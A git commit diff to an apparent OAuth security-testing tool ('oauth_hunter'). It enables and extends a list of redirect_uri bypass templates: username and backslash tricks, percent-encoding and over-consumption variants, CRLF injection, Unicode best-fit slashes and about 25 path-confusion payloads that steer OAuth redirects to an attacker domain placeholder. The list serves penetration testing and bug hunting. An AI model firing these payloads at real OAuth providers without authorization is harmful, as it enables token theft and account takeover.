7d75855d4a3b55af05b340371e5bab76b68418af
Eviatar Gerzi <evyatar575@gmail.com>
2024-09-29 14:14:03 +0300

    Update scenarios.py

--- oauth_hunter/engine/scenarios.py
+++ oauth_hunter/engine/scenarios.py
@@ -37,22 +37,63 @@ REDIRECT_URI_SCENARIOS = [
     (f"{{redirect_scheme}}{{legit_domain}}.{{evil_domain}}{{port}}{{original_path}}", "Subdomain 2 (legit.com.evil.com)"),  # Legit domain inside evil.com, keep original path
     (f"{{redirect_scheme}}{{legit_domain}}{{port}}/any", "Replace path with /any"),  # Change path to "/any"
     (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/any", "Replace path with /any at the end"),  # Change path to "/any" at the end
+    # TODO: this one should be dynamic, replace one note in the part of the domain.
+    #(f"{{redirect_scheme}}é{{evil_domain}}{{port}}{{original_path}}", "IDN homograph with é"),
 
+    # Domain bypasses
     (f"{{redirect_scheme}}{{evil_domain}}%0d%0a{{legit_domain}}{{port}}{{original_path}}", "Carrier trick (https://attacker.com%0d%0atarget.com)"),
     (f"//{{evil_domain}}{{port}}{{original_path}}", "No scheme (//attacker.com)"),
-    # (f"{{redirect_scheme}}{{legit_domain}}@{{evil_domain}}{{port}}{{original_path}}", "Username trick (https://target.com@attacker.com)"),
-    # (f"{{redirect_scheme}}{{evil_domain}}%ff@{{legit_domain}}{{port}}{{original_path}}", "Decode to question mark 1 (https://attacker%ff@target.com)"),
-    # (f"{{redirect_scheme}}{{evil_domain}}%bf:@{{legit_domain}}{{port}}{{original_path}}", "Decode to question mark 2 (https://attacker.com%bf:@target.com)"),
-    # (f"{{redirect_scheme}}{{evil_domain}}%ff@{{legit_domain}}{{port}}{{original_path}}", "Over-consumption 1 (https://attacker.com%ff@target.com)"),
-    # (f"{{redirect_scheme}}{{evil_domain}}%ff.{{legit_domain}}{{port}}{{original_path}}", "Over-consumption 2 (https://attacker%ff.target.com)"),
-    # (f"{{redirect_scheme}}{{evil_domain}}／.{{legit_domain}}{{port}}{{original_path}}", "Best fit mappings 1 (https://attacker.com/.target.com)"),
-    # (f"{{redirect_scheme}}{{legit_domain}}／@{{evil_domain}}{{port}}{{original_path}}", "Best fit mappings 2 (https://target.com/@attacker.com)"),
-    # (f"{{redirect_scheme}}{{evil_domain}}\\@{{legit_domain}}{{port}}{{original_path}}", "Evil Slash Trick 1 (https://attacker.com\@target.com)"),
-    # (f"{{redirect_scheme}}{{legit_domain}}\\@{{evil_domain}}{{port}}{{original_path}}", "Evil Slash Trick 2 (https://target.com\@attacker.com)"),
-    # (f"4{{evil_domain}}://{{legit_domain}}{{port}}{{original_path}}", "Scheme Manipulation"),
-    # (f"{{redirect_scheme}}{{evil_domain}}\\[{{legit_domain}}]{{port}}{{original_path}}", "IPv6 Address Parsing Bug"),
-    # (f"{{redirect_scheme}}{{legit_domain}}.{{evil_domain}}\\@{{legit_domain}}{{port}}{{original_path}}", "Combined Validator"),
+    (f"{{redirect_scheme}}{{legit_domain}}@{{evil_domain}}{{port}}{{original_path}}", "Username trick (https://target.com@attacker.com)"),
+    (f"{{redirect_scheme}}{{evil_domain}}%ff@{{legit_domain}}{{port}}{{original_path}}", "Decode to question mark 1 (https://attacker%ff@target.com)"),
+    (f"{{redirect_scheme}}{{evil_domain}}%bf:@{{legit_domain}}{{port}}{{original_path}}", "Decode to question mark 2 (https://attacker.com%bf:@target.com)"),
+    (f"{{redirect_scheme}}{{evil_domain}}%ff@{{legit_domain}}{{port}}{{original_path}}", "Over-consumption 1 (https://attacker.com%ff@target.com)"),
+    (f"{{redirect_scheme}}{{evil_domain}}%ff.{{legit_domain}}{{port}}{{original_path}}", "Over-consumption 2 (https://attacker%ff.target.com)"),
+    (f"{{redirect_scheme}}{{evil_domain}}／.{{legit_domain}}{{port}}{{original_path}}", "Best fit mappings 1 (https://attacker.com/.target.com)"),
+    (f"{{redirect_scheme}}{{legit_domain}}／@{{evil_domain}}{{port}}{{original_path}}", "Best fit mappings 2 (https://target.com/@attacker.com)"),
+    (f"{{redirect_scheme}}{{evil_domain}}\\@{{legit_domain}}{{port}}{{original_path}}", "Evil Slash Trick 1 (https://attacker.com\@target.com)"),
+    (f"{{redirect_scheme}}{{legit_domain}}\\@{{evil_domain}}{{port}}{{original_path}}", "Evil Slash Trick 2 (https://target.com\@attacker.com)"),
+    (f"4{{evil_domain}}://{{legit_domain}}{{port}}{{original_path}}", "Scheme Manipulation"),
+    (f"{{redirect_scheme}}{{evil_domain}}\\[{{legit_domain}}]{{port}}{{original_path}}", "IPv6 Address Parsing Bug"),
+    (f"{{redirect_scheme}}{{legit_domain}}.{{evil_domain}}\\@{{legit_domain}}{{port}}{{original_path}}", "Combined Validator"),
+    (f"{{evil_domain}}{{legit_domain}}{{port}}%2f%2f.{{legit_domain}}{{original_path}}", "Domain Bypass 1"),
+    (f"{{evil_domain}}{{legit_domain}}{{port}}%5c%5c.{{legit_domain}}{{original_path}}", "Domain Bypass 2"),
+    (f"{{evil_domain}}{{legit_domain}}{{port}}%3F.{{legit_domain}}{{original_path}}", "Domain Bypass 3"),
+    (f"{{evil_domain}}{{legit_domain}}{{port}}%23.{{legit_domain}}{{original_path}}", "Domain Bypass 4"),
+    # TODO: check about this 80 port, it can make problem if we have custom port, although it's not common.
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}:80%40{{evil_domain}}{{original_path}}", "Domain Bypass 5"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}%2e{{evil_domain}}{{original_path}}", "Domain Bypass 6"),
+
+    # Path Confusion
+    # Reference: https://dl.acm.org/doi/fullHtml/10.1145/3627106.3627140
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/{{evil_domain}}", "Path Confusion 1"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}%2F{{evil_domain}}", "Path Confusion 2"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/..%2F{{evil_domain}}", "Path Confusion 3"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%2e%2e%2F{{evil_domain}}", "Path Confusion 4"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/..%252F{{evil_domain}}", "Path Confusion 5"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%252e%252e%252F{{evil_domain}}", "Path Confusion 6"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/{{evil_domain}}/..", "Path Confusion 7"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}%2F{{evil_domain}}%2F..", "Path Confusion 8"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}%2F{{evil_domain}}%2F%2e%2e", "Path Confusion 9"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}%252F{{evil_domain}}%252F..", "Path Confusion 10"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}%252F{{evil_domain}}%252F%252e%252e", "Path Confusion 11"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/;/../../{{evil_domain}}", "Path Confusion 12"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%3B/../../{{evil_domain}}", "Path Confusion 13"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%3B%2F..%2F..%2F{{evil_domain}}", "Path Confusion 14"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%3B%2F%2e%2e%2F%2F%2e%2e{{evil_domain}}", "Path Confusion 15"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%253B%252F..%252F..%252F{{evil_domain}}", "Path Confusion 16"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%0A%0D/../../{{evil_domain}}", "Path Confusion 17"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%0A%0D%2F..%2F..%2F{{evil_domain}}", "Path Confusion 18"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%0A%0D%2F%2e%2e%2F%2F%2e%2e{{evil_domain}}", "Path Confusion 19"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%250A%250D%252F..%252F..%252F{{evil_domain}}", "Path Confusion 20"),
+    # Reference: https://github.com/snyff/oauthsecurity
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/../../new/path", "Path Confusion 21"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%2e%2e/%2e%2e/new/path", "Path Confusion 22"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/%252e%252e/%252e%252e/new/path", "Path Confusion 23"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}/new/path///../../{{original_path}}", "Path Confusion 24"),
+    (f"{{redirect_scheme}}{{legit_domain}}{{port}}{{original_path}}/.%0a./.%0d./new/path", "Path Confusion 25 (For Rails, because it strips \n\d\0)"),
+
 ]
+
 # Calculate the maximum length of the scenario descriptions 'SCENARIOS'
 MAX_SCENARIO_DESCRIPTION_LENGTH = max(len(description) for _, description in REDIRECT_URI_SCENARIOS)
 
